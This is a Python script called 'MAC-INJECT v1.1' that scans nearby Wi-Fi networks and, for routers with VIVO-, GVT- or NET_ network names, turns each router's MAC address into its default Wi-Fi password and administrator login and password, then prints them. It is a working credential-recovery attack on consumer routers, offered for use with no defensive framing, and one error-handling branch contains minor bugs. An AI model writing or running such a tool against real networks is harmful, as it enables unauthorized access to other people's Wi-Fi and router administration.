import os
import re
import time

#essid = nome
#ssid = mac
#Vul nos moldens da NET
#Adicionando exploit login e senha (para net)

verde = '\033[32m'
vermelho = '\033[31m'
azul = '\033[34m'
branco = '\033[37m'
amarelo = '\033[33m'
roxo = '\033[35m'

VulPass = {}
VulADM = {}
VulTotal = []

def Help():
    asciiart = roxo+'''

             .-----.                                                  
           ,' -   - `.                                                
   _ _____/  <q> <p>  \_____ _                                        
  /_||   ||`-._____.-`||   ||-\                                       
 / _||===||           ||===|| _\    
|- _||===||===========||===||- _|    MAC-INJECT v1.1      
\___||___||___________||___||___/                                     
 \\|///   \_:_:_:_:_:_/   \\\|//                                      
 |   _|    |_________|    |   _|                    By ---> Zeref, Santana and J4CK_                  
 |   _|   /( ======= )\   |   _|                                      
 \\||//  /\ `-.___.-' /\  \\||//                                      
  (o )  /_ '._______.' _\  ( o)                                       
 /__/ \ |    _|   |_   _| / \__\                                      
 ///\_/ |_   _|   |    _| \_/\\\                                      
///\\_\ \    _/   \    _/ /_//\\\                                     
\\|//_/ ///|\\\   ///|\\\ \_\\|//                                     
        \\\|///   \\\|///                                             
        /-  _\\   //   _\                                             
        |   _||   ||-  _|           
      ,/\____||   || ___/\,        
     /|\___`\,|   |,/'___/|\                                          
     |||`.\\ \\   // //,'|||                                          
     \\\\_//_//   \\_\\_////                Found in ---> GVT Moldens, Vivo Moldens and Net Moldens
     '''+roxo
    return asciiart

def ChecarDependencias(SaidaTerminal):
    if SaidaTerminal == "":
        return "Faltam pacotes"
    else:
        return "Pacotes instalados"

def Dependecias(PkManager = "apt-get"):
    print(vermelho+"Please install the wireless-tools package. Try auto install..."+vermelho)
    time.sleep(3)
    if PkManager == "apt-get":
        comando = "install -y"
    elif PkManager == "yum":
        comando = "install -y"
    elif PkManager == "dnf":
        comando = "install -y"
    elif PkManager == "pkg":
        comando = "install"
    elif PkManager == "pacman":
        comando = "-S --noconfirm"
    comando = "sudo "+PkManager+" "+comando+" wireless_tools"
    return comando

def Variacoes(ssid, essid):
    essid = essid.replace('"', '')
    ssid = list(ssid)
    essid = list(essid)
    if essid[-1] != ssid[-1]:
        ssid[-1] = essid[-1]
    else:
        ssid = ssid
    ssid = "".join(ssid)
    ssid = str(ssid)
    return ssid

def ADMScan(essid):
    print(azul+"Scanning for ADM..."+azul)
    time.sleep(3)
    if "NET_" in essid:
        VulTotal.append(essid)
        return "Vulneravel adm"

def ExploitADMPass(ssid):
    ssid = ssid.replace("Address: ", "")
    password = ssid.replace(":", "")
    return password

def ExploitADMLogin(ssid):
    print(vermelho+"Exploiting ADM login and password...\n\n"+vermelho)
    time.sleep(3)
    ssid = ssid.replace("Address: ", "")
    ssid = ssid.replace(":", "")
    ssid = list(ssid)
    ssid.pop(0)
    ssid.pop(0)
    ssid.pop(0)
    ssid.pop(0)
    ssid.pop(0)
    ssid.insert(0,"N")
    ssid.insert(1,"E")
    ssid.insert(2,"T")
    ssid.insert(3,"_")
    ssid = "".join(ssid)
    login = str(ssid)
    return login

def InjetarADM(ssid): #se o scan retornar vul, ele pega e injeta o exploit no ssid que retornou vul
    print(azul+"Injecting ADM login and password exploit..."+azul)
    time.sleep(3)
    login = ExploitADMLogin(ssid)
    VulADM[login] = ExploitADMPass(ssid)

def Exploit(ssid, essid):
    print(vermelho+"Exploiting...\n\n"+vermelho)
    time.sleep(3)
    ssid = Variacoes(ssid, essid)
    ssid = list(ssid)
    if "VIVO-" in essid:
        ssid.pop(0)
        ssid.pop(0)
    elif "GVT-" in essid:
        pass
    elif "NET_" in essid:
        ssid.pop(0)
        ssid.pop(0)
        ssid.pop(0)
        ssid.pop(0)             
    ssid = "".join(ssid)
    ssid = str(ssid)
    return ssid

def WifiLocal():
    print(verde+"Scanning..."+verde)
    time.sleep(3)
    os.system("iwlist scan > wifi.txt")
    wifi = open("wifi.txt", "r+")
    wifi = wifi.read()
    return wifi

def Injetar(ssid, essid):
    print("Injecting exploit...")
    time.sleep(3)
    essid = essid[i].replace("ESSID:","")
    ssid = ssid[i].replace("Address: ", "")
    ssid = Exploit(ssid, essid)
    ssid = ssid.replace(":", "")
    VulPass[essid] = ssid

def WifiScan(wifi, vul = "VIVO-"):
    print(azul+"Scanning "+wifi+"..."+azul)
    time.sleep(3)
    if vul in wifi or "GVT-" in wifi or "NET_" in wifi:
        return "Vulneravel"

try:
    print(Help())
    wifi = WifiLocal()
    if ChecarDependencias(wifi) == "Faltam pacotes":
        os.system(Dependecias(input(vermelho+"Type your package manager (standard = apt-get): "+vermelho)))
        ssid = re.findall(r'Address: ..:..:..:..:..:..', wifi)
        essid = re.findall(r'ESSID:".+"', wifi)
        for i in range(len(essid)):
            if WifiScan(essid[i]) == "Vulneravel adm":
                Injetar(ssid,essid)
            #else:
            #    print(branco+"Vulnerability not found.\n\n"+branco)
         
        for i in Vul:
            print(i)
    else:
        ssid = re.findall(r'Address: ..:..:..:..:..:..', wifi)
        essid = re.findall(r'ESSID:".+"', wifi)
        for i in range(len(essid)):
            if WifiScan(essid[i]) == "Vulneravel":
                Injetar(ssid,essid)
            else:
                print(branco+"Vulnerability not found.\n\n"+branco)
            if ADMScan(essid[i]) == "Vulneravel adm":
                InjetarADM(ssid[i])
            else:
                print(branco+"Vulnerability not found.\n\n"+branco)
        print(amarelo+"\n\n####Wifi Passwords####"+amarelo)
        for i in VulPass:
            print("\n\n"+verde+"ESSID: "+verde+i+vermelho+"\nPassword: "+VulPass[i]+vermelho)
        print(amarelo+"\n\n####Logins and Passwords####"+amarelo)
        for i in range(len(VulTotal)):
            for o in VulADM:
                print(branco+"\n\n"+VulTotal[i]+branco)
                print(verde+"Login: "+verde+o+vermelho+"\nPassword: "+VulADM[o]+vermelho+"\n")
except Exception as c:
    print(c)